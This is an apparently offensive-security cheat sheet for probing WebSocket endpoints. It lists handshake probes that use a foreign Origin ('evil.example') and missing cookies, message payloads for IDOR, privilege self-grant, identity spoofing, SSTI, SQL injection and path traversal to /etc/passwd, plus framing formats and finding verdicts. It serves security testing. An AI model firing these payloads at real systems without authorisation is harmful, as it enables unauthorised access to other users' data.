# Quick reference — the one-screen cheat sheet

## The pass

```
1. bundle -> the ws endpoint + the client lib + the schema
2. handshake -> Origin/cookie/token/sub-protocol/auth
3. schema   -> the action+field set from the frames/bundle
4. frames   -> one mutated field per connection
5. verdict  -> a victim-data frame or a state-change (not a 101)
6. route    -> web-idor / web-auth-session / the payload class
```

## The handshake probes

```bash
python3 tools/web/ws_probe.py "$WS/ws" --origin 'https://evil.example' --message '{}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' --message '{"action":"me"}'
python3 tools/web/ws_probe.py "$WS/ws" --message '{"action":"me"}'   # no cookie
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Sec-WebSocket-Protocol: graphql-ws'
```

## The message probes (one per connection)

```json
{"action":"read","id":"victim"}       -> message-IDOR
{"action":"join","room":"admin"}      -> a restricted channel
{"action":"admin"}                    -> a privileged action
{"from":"victim","text":"hi"}         -> identity-spoof
{"action":"x","role":"admin"}         -> a self-grant
{"q":"{{7*7}}"}                       -> ssti
{"q":"' OR 1=1--"}                    -> sqli
{"file":"../../etc/passwd"}           -> lfi
```

## The framing shapes

| Transport | Send |
|---|---|
| raw WS | `{"action":"x"}` |
| Socket.IO | `42["action",{...}]` |
| SockJS | `a["{...}"]` |
| STOMP | `SEND destination:/app/x` |
| graphql-ws | `{"type":"subscribe",...}` |
| protobuf | binary → `proto_decode.py` |

## The verdicts

- `101` + foreign-Origin + cookie-binding + victim-data → CSWSH
- `101` + no-cookie + victim-data → unauth channel
- a frame carrying another's object → message-IDOR
- a privileged action reply → action-dispatch gap
- `?token=` → credential-in-URL
- `101`+empty → closed channel, not a finding

## The boundary

- a frame field carrying a payload → the PAYLOAD's class
- an HTTP object-id gap → `web-idor`
- a one-shot forged request → `web-csrf` (CSWSH is stronger)
